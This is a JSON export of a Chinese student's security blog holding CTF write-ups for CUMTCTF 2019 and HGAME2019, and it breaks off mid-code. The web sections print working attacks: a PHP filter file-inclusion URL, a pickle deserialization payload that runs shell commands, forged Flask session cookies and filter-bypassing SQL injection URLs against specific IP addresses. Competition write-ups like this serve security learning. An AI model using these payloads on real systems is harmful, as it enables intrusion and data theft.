{"meta":{"title":"Aesm1p' Blog","subtitle":"前方如聂鲁达的爱情诗一般美好","description":"相逢意气为君饮","author":"Aesm1p","url":"http://chaosec.top"},"pages":[{"title":"About Me","date":"2019-02-21T06:37:26.063Z","updated":"2019-01-31T04:11:17.786Z","comments":false,"path":"about/index.html","permalink":"http://chaosec.top/about/index.html","excerpt":"","text":"把酒祝东风，且共从容。 作者： Charles Han就读学校：中国矿业大学专业方向：网络安全小白邮箱：PPointCharles@163.comQQ：MTQyNjU5NDE3NA=="},{"title":"archives","date":"2018-01-25T06:48:22.000Z","updated":"2018-01-25T12:22:49.935Z","comments":true,"path":"archives/index.html","permalink":"http://chaosec.top/archives/index.html","excerpt":"","text":""},{"title":"All categories","date":"2018-01-25T07:04:01.037Z","updated":"2018-01-25T07:04:01.037Z","comments":true,"path":"categories/index.html","permalink":"http://chaosec.top/categories/index.html","excerpt":"","text":""},{"title":"schedule","date":"2019-01-30T06:24:13.000Z","updated":"2019-01-30T08:46:23.627Z","comments":true,"path":"schedule/index.html","permalink":"http://chaosec.top/schedule/index.html","excerpt":"","text":""},{"title":"B&M&M&V","date":"2020-01-04T07:04:50.461Z","updated":"2020-01-04T07:04:50.461Z","comments":false,"path":"soul/index.html","permalink":"http://chaosec.top/soul/index.html","excerpt":"The article has been encrypted, please enter your password to view.","text":"相逢意气为君饮 Incorrect Password! No content to display! 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"},{"title":"tag_archive","date":"2019-01-30T04:08:14.000Z","updated":"2019-01-30T04:08:14.493Z","comments":true,"path":"tag-archive/index.html","permalink":"http://chaosec.top/tag-archive/index.html","excerpt":"","text":""},{"title":"All tags","date":"2018-01-07T06:29:33.000Z","updated":"2018-01-07T06:31:36.622Z","comments":true,"path":"tags/index.html","permalink":"http://chaosec.top/tags/index.html","excerpt":"","text":""},{"title":"All categories","date":"2018-01-25T07:11:11.609Z","updated":"2018-01-25T07:11:11.609Z","comments":true,"path":"categories/index-2.html","permalink":"http://chaosec.top/categories/index-2.html","excerpt":"","text":""},{"title":"category_archive","date":"2019-01-30T04:05:38.000Z","updated":"2019-01-30T04:05:38.357Z","comments":true,"path":"category-archive/index.html","permalink":"http://chaosec.top/category-archive/index.html","excerpt":"","text":""}],"posts":[{"title":"CUMTCTF第三轮月赛与决赛","slug":"cumtctf3","date":"2019-05-22T08:36:44.000Z","updated":"2020-01-05T13:03:46.155Z","comments":true,"path":"2019/05/22/cumtctf3/","link":"","permalink":"http://chaosec.top/2019/05/22/cumtctf3/","excerpt":"第三次双月赛题解","text":"第三次双月赛题解 Crypto古典密码签到维吉尼亚密码，密文juttaigykhpmjyreca，秘钥cumt，在线解密即可https://www.qqxiuzi.cn/bianma/weijiniyamima.php flag: flag{hahayoufindtheflag} encode题目给出的pyc文件，在线反编译一下即可得到源代码 很简单的解密题，按照相反的逻辑解密即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/usr/bin/env python# encoding: utf-8import base64def encode1(ans): s = '' for i in ans: x = ord(i) ^ 36 x = x + 25 s += chr(x) return sdef encode2(ans): s = '' for i in ans: x = ord(i) + 36 x = x ^ 36 s += chr(x) return sdef encode3(ans): return base64.b32encode(ans)flag = ' 'final = 'LOQ2NJFYU5YH2WTUU5VHJIDXLJNVW2LQO52WS2L6PVUVW2TQLJNVSWLJUBN3E==='# if encode3(encode2(encode1(flag))) == final:# print 'correct'# else:# print 'wrong'def decode3(ans): return base64.b32decode(ans)def decode2(ans): s = '' for i in ans: x = ord(i) x = x ^ 36 x = x - 36 s += chr(x) return sdef decode1(ans): s = '' for i in ans: x = ord(i) x = x - 25 x = x ^ 36 s += chr(x) return s print decode1(decode2(decode3(final))) 1flag&#123;b38e7b57c2eff432044984f53efdd4cf&#125; webweb签到1简单的文件包含即可 1http://202.119.201.199:30100/?page=php://filter/read=convert.base64-encode/resource=cxk.php flag{CumtCTF_this_iS_a_RElLy_fLaG!!!} Web签到212345678910111213141516171819202122232425262728293031class P &#123; private $var; function __invoke()&#123; eval( 'global '.$this -&gt; var.';'. '$ret = '.$this -&gt; var.';' ); return $ret; &#125;&#125;class K &#123; protected $fn; public $name; function __toString()&#123; echo 'string'; $fn = $this -&gt; fn; return $fn(); &#125;&#125;class U &#123; public $obj; function __wakeup()&#123; if (!isset($this-&gt;obj-&gt;name) || $this-&gt;obj-&gt;name != \"iv4n\") &#123; $this -&gt; obj -&gt; fn = function()&#123;&#125;; &#125; &#125;&#125;echo unserialize($_POST['obj'])-&gt;obj; flag{0k_y0u_4lr3ady_kn0w_uns3ria1ize} Baby Flaskflask项目的网站，查看源代码可以看到github网址，给出了网站源码， 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/python3.6import osimport picklefrom base64 import b64decodefrom flask import Flask, request, render_template, sessionapp = Flask(__name__)# add secret key to enable session# and this is a fake secret key, just an exampleapp.config['SECRET_KEY'] = 'you_find_secret_key_congratulations'User = type('User', (object,), &#123; 'uname': 'test', 'is_admin': 0, '__repr__': lambda o: o.uname,&#125;)@app.route('/', methods=('GET',))def index_handler(): if not session.get('u'): u = pickle.dumps(User()) session['u'] = u return render_template('index.html')@app.route('/file', methods=('GET',))def file_handler(): path = request.args.get('file') path = os.path.join('static', path) if not os.path.exists(path) or os.path.isdir(path) \\ or '.py' in path or '.sh' in path or '..' in path: return 'disallowed' with open(path, 'r') as fp: content = fp.read() return content@app.route('/admin', methods=('GET',))def admin_handler(): try: u = session.get('u') print(pickle.loads(b'\\x80\\x03cprogram_main_app@@@\\nUser\\nq\\x00)\\x81q\\x01.')) if isinstance(u, dict): u = b64decode(u.get('b')) u = pickle.loads(u) if u.is_admin == 1: return 'welcome, admin' else: return 'who are you?' except Exception: return 'uhh?' if __name__ == '__main__': app.run('0.0.0.0', port=80, debug=False) 可以看到file路由处可以进行文件读取 查看历史提交记录可以看到某个版本中有如下语句 1app.config['SECRET_KEY'] = os.getenv('secret_key') 可以看到环境变量中写入了秘钥值，结合上面的文件读取漏洞，我们可以读取到该秘钥值，也可以知道用户是iv4n 读取到秘钥就可以伪造session了，查看admin的代码可以知到此处利用了pickle模块，该模块可以进行序列化操作，而且也存在反序列化漏洞，可以利用reduce方法来进行命令执行 12345678910111213import base64import pickleimport osclass User(object): def __reduce__(self): a = \"`ls / -l &gt; /home/iv4n/3.txt`\" return (os.system,(a,))u = pickle.dumps(User())print(u)bu = base64.b64encode(u)print(bu) 这里坑的地方在于，当时我发现这个命令执行漏洞没有回显，所以我先尝试了反弹shell，结果bash反弹失败了，此处我尝试了将命令执行的结果写入文件中，然后读取文件即可，此处需要注意的是写入文件是有权限限制的，起初我想在根目录或者项目目录中写入文件，但是都失败了，估计是权限不够，必须找一个有权限的目录才行，我们前面已经知道了项目用户是iv4n，那么我们直接写入该用户的目录下不就行了，用上面的命令输出值之后进行session伪造即可（使用base64是为了防止编码问题） 1py flask_session_cookie_manager3.py encode -s you_find_secret_key_congratulations -t &#123;&apos;u&apos;:&#123;&apos;b&apos;:b&apos;gANjcG9zaXgKc3lzdGVtCnEAWD0AAABgY2F0IC9mMWxsMWxsMTQ0NGFhYWcvZjFsbDFsbDE0NDRhYWFnID4gL2hvbWUvaXY0di9ndWVzcy50eHRgcQGFcQJScQMu&apos;&#125;&#125; 然后修改cookie，刷新admin页面，然后去读文件 可以看到flag文件，直接读取即可 PS：反弹shell失败的原因在于我使用的是bash反弹shell，而题目环境中没有bash而是sh，而且也没有/dev/tcp文件，可以通过fork子进程来进行反弹shell 我走的一个弯路在于一直想以admin身份登录（虽然登录之后毛都没有），但是一直报错，记录一下自己的方法 pickle模块在序列化类的时候，是不会序列化具体值的，我们解密cookie的值为 1&#123;&apos;u&apos;:b&apos;\\x80\\x03cprogram_main_app@@@\\nUser\\nq\\x00)\\x81q\\x01.&apos;&#125; 可以看到并没有包含User的具体字段的信息，换句话说我们即使本地修改了is_admin的值，在服务器端反序列化之后也并没有被记录，而是直接以代码中的定义来初始化，也就是 12345User = type('User', (object,), &#123; 'uname': 'test', 'is_admin': 0, '__repr__': lambda o: o.uname,&#125;) is_admin又被初始化为0了，所以我们无法登陆成功，那么怎么解决这个问题呢？ 我们可以通过将is_admin设置为类属性来解决 1234567891011import pickleimport base64class User(object): def __init__(self): self.a = 2 self.is_admin = 1a=User()c=pickle.dumps(a)print(c)print(base64.b64encode(c))pickle.loads(c) 1b&apos;\\x80\\x03c__main__\\nUser\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x01\\x00\\x00\\x00aq\\x03K\\x02X\\x08\\x00\\x00\\x00is_adminq\\x04K\\x01ub.&apos; 可以看到is_admin被序列化了（个人理解是dump方法会序列化类的属性），然后需要注意一点，上面的输出包含__mian__，和我们从网站解密的对比一下 b’\\x80\\x03cprogram_main_app@@@\\nUser\\nq\\x00)\\x81q\\x01.’ 同样位置是program_main_app@@@，这应该是模块名，如果不对应的化反序列化会失败，此处我们也需要进行相应的修改，最终如下 1b&apos;\\x80\\x03cprogram_main_app@@@\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x01\\x00\\x00\\x00aq\\x03K\\x02X\\x08\\x00\\x00\\x00is_adminq\\x04K\\x01ub.&apos; CUMTCTF_FINAL_2019MISC委屈的兔兔打开图片，查看16进制即可在尾部看到unicode编码，解码即可得到flag key{you are right} 两岁半的猪拖进stegsolve就会简单移位就可以看到二维码 flag{AppLeU0} 寻找你的keyzip伪加密，之后是一个exe文件，拖进16进制查看发现是反向的base64图片编码，在线解码即可得到二维码，扫描可得flag KEY{dca57f966e4e4e31fd5b15417da63269} 302抓包去掉referer头可以看到base64编码图片，解码得到图片，然后还可以看到有个key字段，值为123.com，然后用key值在线解密网站解密即可 1http://www.atool9.com/steganography.php flag{85bb86974a2a33bd4032ea3b7264b831} WEB签到题md5弱比较 1234567$s = sanitize_user_input($_GET['s']); $h = secured_hash_function($_GET['h']); $r = gen_secured_random(); if($s != false &amp;&amp; $h != false) &#123; if($s.$r == $h) &#123; print \"Well done! Here is your flag: \".$flag; &#125; 因为是将$s放在前面而且允许输入数字，那我们就可以利用MD5弱比较来进行绕过，右边生成一个0e开头的纯数字md5，左边直接输入0e与后面数字拼接即可验证通过 SQL注入测试列数，发现过滤，双写可以绕过 1http://120.78.164.84:49098/list.php?id=1&apos; oorrder by 4-- + 测试一下过滤，发现只过滤union，select，or，然后开始正常联合注入 数据库名ctf 爆表名123http://120.78.164.84:49098/list.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=database()-- +ctf,f1ag1nit 爆列名 123http://120.78.164.84:49098/list.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name=&apos;f1ag1nit&apos;-- +id,flag 爆flag时发现flag被过滤了，现在需要在不输入列名的情况下得到数据，百度搜索到一个方法 1https://blog.csdn.net/qq_35078631/article/details/78589926 不过例子中的左右都是三列，使用union没有问题，而本题中f1ag1nit中只有两个字段，如果直接使用联合注入的话会因为列数不相等报错，所以我们需要给它认为加上一列，payload如下： 1http://120.78.164.84:49098/list.php?id=-1&apos; uniunionon seselectlect * from (seselectlect 1)a,(seselectlect 2)b,(seselectlect 3)c ununionion seselectlect * from f1ag1nit a,(selselectect 2) b limit 1,2-- + 1flag&#123;3eaba49ada2ec0aa44ceaa7beee35401&#125;","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"Unknown Article","slug":"kaoyan","date":"2019-03-08T14:58:33.000Z","updated":"2019-09-24T12:39:13.002Z","comments":true,"path":"2019/03/08/kaoyan/","link":"","permalink":"http://chaosec.top/2019/03/08/kaoyan/","excerpt":"The article has been encrypted, please enter your password to view.","text":"君心我心 Incorrect Password! No content to display! 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","categories":[{"name":"随笔","slug":"随笔","permalink":"http://chaosec.top/categories/随笔/"}],"tags":[{"name":"Essay","slug":"Essay","permalink":"http://chaosec.top/tags/Essay/"}]},{"title":"HGAME2019-Web-Week3&4","slug":"hgame2019b","date":"2019-03-02T07:55:12.000Z","updated":"2019-03-17T13:09:45.519Z","comments":true,"path":"2019/03/02/hgame2019b/","link":"","permalink":"http://chaosec.top/2019/03/02/hgame2019b/","excerpt":"week-3","text":"week-3 神奇的MD5文件探测一下发现存在备份文件泄露.login.php.swp，核心代码如下1234567891011121314151617181920&lt;?phpsession_start();error_reporting(0);if (@$_POST['username'] and @$_POST['password'] and @$_POST['code'])&#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; $code = (string)$_POST['code']; if 